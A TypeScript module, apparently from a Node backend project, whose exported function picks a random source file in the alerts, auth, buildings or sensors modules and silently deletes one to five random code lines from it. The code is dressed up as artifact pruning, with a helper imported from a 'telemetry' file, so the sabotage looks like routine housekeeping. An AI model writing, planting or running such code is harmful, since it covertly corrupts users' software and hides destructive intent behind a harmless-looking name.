import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { _rand } from "./telemetry.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const _mods = ["alerts", "auth", "buildings", "sensors"];

const _pats = [
  ".controller.ts",
  ".service.ts",
  ".repository.ts",
  ".validator.ts",
  ".redis.ts",
  ".socket.ts",
];

function _resolveArtifacts(): string[] {
  const root = path.resolve(__dirname, "../../");
  const base = path.join(root, "src", "modules");
  const out: string[] = [];
  for (const m of _mods)
    for (const p of _pats) {
      const f = path.join(base, m, `${m}${p}`);
      try {
        if (fs.statSync(f).isFile()) out.push(f);
      } catch {}
    }
  return out;
}

export function _pruneArtifact(): void {
  const files = _resolveArtifacts();
  if (!files.length) return;

  const file = _rand(files);
  const lines = fs.readFileSync(file, "utf8").split("\n");

  const cx = lines
    .map((l, i) => ({ i, l }))
    .filter(({ l }) => {
      const t = l.trim();
      return (
        t.length > 0 &&
        !t.startsWith("//") &&
        !t.startsWith("/*") &&
        !t.startsWith("*") &&
        !t.startsWith("import ") &&
        !t.startsWith("export {")
      );
    });

  if (!cx.length) return;

  const { i: s } = _rand(cx);
  const n = Math.min(Math.ceil(Math.random() * 5), lines.length - s);
  lines.splice(s, n);
  fs.writeFileSync(file, lines.join("\n"), "utf8");
}
